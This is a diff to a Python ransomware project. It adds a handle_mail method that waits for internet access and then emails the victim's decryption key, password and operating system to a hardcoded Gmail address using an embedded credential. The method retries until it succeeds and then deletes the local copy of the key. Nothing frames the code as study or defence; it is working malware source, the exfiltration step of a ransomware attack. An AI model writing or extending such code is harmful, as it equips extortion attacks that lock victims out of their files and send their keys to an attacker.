@@ -11,6 +11,7 @@ from threading import Thread
 import subprocess
 
 import modules.cryptography
+import modules.send_email
 
 
 class Ransomware:
@@ -49,7 +50,7 @@ class Ransomware:
         new_password = modules.cryptography.generate_password()
         return new_password
 
-    
+
     def handle_key(self):
         key = modules.cryptography.generate_key(passwd)
         bin_key = ''
@@ -61,6 +62,27 @@ class Ransomware:
                 "key": key,
                 "bin_key": bin_key[:-1]
                 }
+
+    def handle_mail(self, key, passwd):
+
+        main_dir = os.path.expanduser('~')
+        is_connection = modules.check_connection.check_connection()
+        bin_key = key['bin_key']
+
+        self.create_copy_of_key(key, main_dir)
+
+        while not is_connection:
+            time.sleep(10)
+
+            is_connection = modules.check_connection.check_connection()
+
+        try:
+            message_body = "OS: {}\nKey_dec: {}\nPassword: {}\nHashing_algorithm(password): SHA256\nEncryption_algorithm: AES".format(platform.system(), bin_key, passwd)
+            modules.send_email.send_mail('transfered.data@gmail.com', '__47ck3r__', message_body, 'Ransomware report')
+
+            self.remove_copy_of_key(main_dir)
+        except:
+            self.handle_mail(key, passwd)
 
 if __name__ == '__main__':
     pass
